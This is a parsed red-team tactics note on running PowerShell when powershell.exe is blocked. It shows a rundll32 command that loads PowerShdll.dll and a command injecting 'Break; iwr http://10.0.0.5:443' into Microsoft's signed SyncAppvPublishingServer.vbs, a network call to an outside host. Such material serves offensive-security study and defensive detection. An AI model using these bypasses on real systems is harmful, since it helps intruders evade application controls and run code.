---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Powershell Without Powershell.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-powershell-without-powershell` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/powershell-without-powershell.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.

## Preserved Body

````markdown
Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.

If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.

## PowerShdll

```
rundll32.exe PowerShdll.dll,main
```

![](<../../_assets/pwshll-rundll32.gif>)

Note that the same could be achieved with a compiled .exe binary from the same project, but keep in mind that .exe is more likely to run into whitelisting issues.

## SyncAppvPublishingServer

Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```

![](<../../_assets/pwshll-SyncAppvPublishingServer.png>)

![](<../../_assets/pwshll-SyncAppvPublishingServer.gif>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/powershell-without-powershell.exe.md)

## Evidence Excerpt

```text
_asset_filenames:
- pwshll-SyncAppvPublishingServer.gif
- pwshll-SyncAppvPublishingServer.png
- pwshll-rundll32.gif
_body: '# Powershell Without Powershell.exe
Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell
as we know it.
If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there
```
